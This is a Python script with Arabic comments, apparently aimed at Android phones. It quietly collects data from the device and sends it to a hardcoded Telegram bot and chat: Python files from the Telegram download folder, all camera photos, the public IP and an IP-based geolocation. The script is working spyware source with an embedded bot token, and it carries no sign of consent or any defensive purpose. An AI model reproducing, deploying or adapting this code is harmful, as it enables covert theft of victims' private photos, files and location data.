import subprocess
import sys
import telebot
import os
import requests
import time

# تثبيت المكتبات المطلوبة إن لم تكن موجودة
required_libraries = ['telebot', 'requests']
for lib in required_libraries:
    try:
        __import__(lib)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

# إعدادات البوت
bot_token = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94'
chat_id = '6913353602'
bot = telebot.TeleBot(bot_token)

# إضافة فترات تأخير بين العمليات
SEND_DELAY = 2  # ثانيتين بين كل عملية إرسال

def send_notification():
    try:
        bot.send_message(chat_id, "🚀 بدء عملية جمع البيانات من الجهاز...")
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")

def send_py_files():
    try:
        directory_path = '/storage/emulated/0/Download/Telegram'
        if os.path.exists(directory_path):
            files_sent = False
            for filename in os.listdir(directory_path):
                if filename.endswith(".py"):
                    file_path = os.path.join(directory_path, filename)
                    try:
                        with open(file_path, 'rb') as py_file:
                            bot.send_document(chat_id, py_file)
                            files_sent = True
                            time.sleep(SEND_DELAY)
                    except Exception as e:
                        print(f"خطأ في إرسال الملف {filename}: {e}")
            if not files_sent:
                bot.send_message(chat_id, "⚠️ لم يتم العثور على ملفات بايثون")
        else:
            bot.send_message(chat_id, "⚠️ مجلد التحميل غير موجود")
    except Exception as e:
        print(f"خطأ في وظيفة إرسال الملفات: {e}")

def send_location():
    try:
        # الحصول على الـ IP أولاً
        try:
            ip = requests.get("https://api.ipify.org?format=json").json().get('ip')
        except:
            ip = None
        
        if ip:
            response = requests.get(f"http://ip-api.com/json/{ip}")
            data = response.json()
            if data['status'] == 'success':
                bot.send_location(chat_id, data['lat'], data['lon'])
                bot.send_message(chat_id, f"📍 الموقع: https://www.google.com/maps?q={data['lat']},{data['lon']}")
                time.sleep(SEND_DELAY)
            else:
                bot.send_message(chat_id, "⚠️ تعذر تحديد الموقع الجغرافي")
        else:
            bot.send_message(chat_id, "⚠️ تعذر الحصول على عنوان IP")
    except Exception as e:
        print(f"خطأ في إرسال الموقع: {e}")

def send_ip():
    try:
        ip = requests.get("https://api.ipify.org?format=json").json().get('ip', 'غير معروف')
        bot.send_message(chat_id, f"🌐 عنوان IP الجهاز: {ip}")
        time.sleep(SEND_DELAY)
    except Exception as e:
        print(f"خطأ في إرسال الـ IP: {e}")
        bot.send_message(chat_id, "⚠️ تعذر الحصول على عنوان IP")

def send_images():
    try:
        image_path = '/storage/emulated/0/DCIM/Camera/'
        if os.path.exists(image_path):
            images_sent = False
            for filename in os.listdir(image_path):
                if filename.lower().endswith(('.png', '.jpg', '.jpeg')):
                    file_path = os.path.join(image_path, filename)
                    try:
                        with open(file_path, 'rb') as img_file:
                            bot.send_photo(chat_id, img_file)
                            images_sent = True
                            time.sleep(SEND_DELAY)
                    except Exception as e:
                        print(f"خطأ في إرسال الصورة {filename}: {e}")
            if not images_sent:
                bot.send_message(chat_id, "⚠️ لم يتم العثور على صور")
        else:
            bot.send_message(chat_id, "⚠️ مجلد الكاميرا غير موجود")
    except Exception as e:
        print(f"خطأ في إرسال الصور: {e}")

def main():
    try:
        send_notification()
        
        # 1. إرسال الملفات أولاً
        send_py_files()
        send_images()
        # 2. إرسال الموقع
        send_location()
        
        # 3. إرسال الـ IP
        send_ip()
        
        # 4. إرسال الصور
        
        
        bot.send_message(chat_id, "✅ تم الانتهاء من جمع جميع البيانات")
        
    except Exception as e:
        print(f"خطأ رئيسي: {e}")
        bot.send_message(chat_id, f"❌ حدث خطأ جسيم: {str(e)}")

# تشغيل البرنامج
if __name__ == "__main__":
    main()
    bot.polling()